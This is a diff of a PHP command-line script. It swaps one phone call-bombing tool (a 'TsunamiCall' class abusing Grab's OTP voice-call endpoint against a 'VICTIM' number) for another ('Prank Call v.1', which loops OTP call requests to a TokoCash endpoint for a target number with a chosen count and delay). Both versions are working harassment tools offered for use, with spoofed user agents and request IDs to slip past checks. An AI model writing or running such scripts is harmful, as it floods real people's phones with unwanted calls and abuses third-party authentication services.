@@ -1,111 +1,63 @@
-<?php
-function get(){
-	return trim(fgets(STDIN));
+<?php 
+error_reporting(0);
+echo "\033[1;31m[+]-==================================================-[+]\n";
+echo"\t\t\033[1;33m 
+  _     ___
+ | |   / _ \
+ | | _| | | | __ _ _______ _ __
+ | |/ / | | |/ _` |_  / _ \ '__|
+ |   <| |_| | (_| |/ /  __/ |
+ |_|\_\\\___/ \__,_/___\___|_|
+ 
+// Ssttt !!! be Quiet!
+// Prank Call v.1
+// CODED BY k0azer
+// nhansanc3z@gmail.com\n";
+echo "\033[1;31m[+]-==================================================-[+]\n\033[1;37m";
+echo " \033[1;36m[\033[1;35m?\033[1;36m] Nomor Target (Ex : 089xxxxxx) => \033[1;33m";
+$nomer = trim(fgets(STDIN));
+if ($nomer == ''){
+	die(" [!] Harap Masukkan Nomer !!");
+} 
+echo " \033[1;36m[\033[1;35m?\033[1;36m] Jumlah Spam => \033[1;33m";
+$jumlah = trim(fgets(STDIN));
+if ($jumlah == ''){
+	die(" [!] Harap Masukkan Jumlah (Max 3 per Nomer)!!");
+} 
+echo " \033[1;36m[\033[1;35m?\033[1;36m] Delay Per Detik (1 - 999) => \033[1;33m";
+$delay = trim(fgets(STDIN));
+if ($delay == ''){
+	die(" [!] Harap Masukkan Delay !!");
+} 
+echo "\n\033[1;33mReady to Prank Call...\n\n";
+for($a=0;$a<$jumlah;$a++) {
+$ch = curl_init();
+curl_setopt ($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
+$payload = "msisdn=".$nomer."&accept=call";
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+curl_setopt ($ch, CURLOPT_POSTFIELDS, $payload);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+$proxy = '204.116.211.750';
+$port = '8080';
+//curl_setopt($ch, CURLOPT_PROXY, "167.71.182.13");
+//curl_setopt($ch, CURLOPT_PROXYPORT, "3128");
+//curl_setopt($ch, CURLOPT_VERBOSE, 1);
+$result = curl_exec($ch);
+$tu = json_decode($result, true);
+$otp = $tu[data][otp_attempt_left];
+date_default_timezone_set('Asia/Jakarta'); 
+$waktu = date("H:i:s");
+sleep($delay);
+$no = $a+1;
+if ($tu[code] == '200000'){
+	echo "\033[1;37m[$no] \033[1;32mCalling => $nomer.......  Prank Tersisa : $otp \033[1;37m[$waktu]\n";
 }
-class TsunamiCall{
-	public function __construct($no){
-		$this->number = $no;
-	}
-	private function get(){
-		return trim(fgets(STDIN));
-	}
-	private function correct($no){
-		$cek = substr($no,0,2);
-		if($cek=="08"){
-			$no = "62".substr($no,1);
-		}
-		return $no;
-	}
-	private function ekse(){
-		$no = $this->correct($this->number);
-		$rand = rand(0123456,9999999);
-		$rands = $this->randStr(12);
-		$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
-		$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
-		$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
-		$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
-		$h[] = "Content-Type: application/x-www-form-urlencoded";
-		$h[] = "Content-Length: ".strlen($post);
-		$h[] = "Host: api.grab.com";
-		$h[] = "Connection: close";
-		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
-		curl_setopt($ch, CURLOPT_POST, 1);
-		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-		curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		$x = curl_exec($ch); curl_close($ch);
-		$ekse = json_decode($x,true);
-		if(empty($ekse['challengeID'])){
-			echo "Fail\n";
-		}else{
-			echo "Done!\n";
-		}
-	}
-	private function loop($many,$sleep=null){
-		$a=0;
-		$no = $this->correct($this->number);
-		while($a<$many){
-			$rand = rand(0123456,9999999);
-			$rands = $this->randStr(12);
-			$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
-			$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
-			$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
-			$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
-			$h[] = "Content-Type: application/x-www-form-urlencoded";
-			$h[] = "Content-Length: ".strlen($post);
-			$h[] = "Host: api.grab.com";
-			$h[] = "Connection: close";
-			$ch = curl_init();
-			curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
-			curl_setopt($ch, CURLOPT_POST, 1);
-			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-			curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
-			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-			$x = curl_exec($ch); curl_close($ch);
-			$ekse = json_decode($x,true);
-			if(empty($ekse['challengeID'])){
-				continue;
-			}else{
-				$nn = $a+1;
-				echo " Call [$nn] done! \r";
-				$a++;
-			}
-			if($sleep!=null) sleep($sleep);
-			if($a>=$many) echo "\nDone!\n";
-		}
-	}
-	private function randStr($l){
-		$data = "abcdefghijklmnopqrstuvwxyz1234567890";
-		$word = "";
-		for($a=0;$a<$l;$a++){
-			$word .= $data{rand(0,strlen($data)-1)};
-		}
-		return $word;
-	}
-	public function run(){
-		while(true){
-			echo "Loop(y/n)?		";
-			$loop = $this->get();
-			if($loop=="y" OR $loop=="n"){
-				break;
-			}else{
-				echo "Somthing wrong :( Contact INSTA: @ZAID_HTML n\n";
-				continue;
-			}
-		}
-		if($loop=="y"){
-			echo "How Many Calls?			";
-			$many = $this->get();
-			$this->loop($many);
-		}else{
-			$this->ekse();
-		}
-	}
+else if($tu[message] == 'Limit reached'){
+	echo "\033[1;37m[$no] \033[1;31mFailed Calling => $nomer - Reason : Limit Reached \033[1;37m[$waktu]\n";
+	die("\n  Exiting...........");
 }
-echo "#################################\n# IG : @ZAID_HTML | GITHUB : Z1011D#\n#################################\n";
-echo "#################################\n# Input VICTIM Number with country Code  #\n#################################\n";
-echo "Number?			";
-$no = get();
-$n = new TsunamiCall($no);
-$n->run();
+curl_close($ch);
+}
+?>
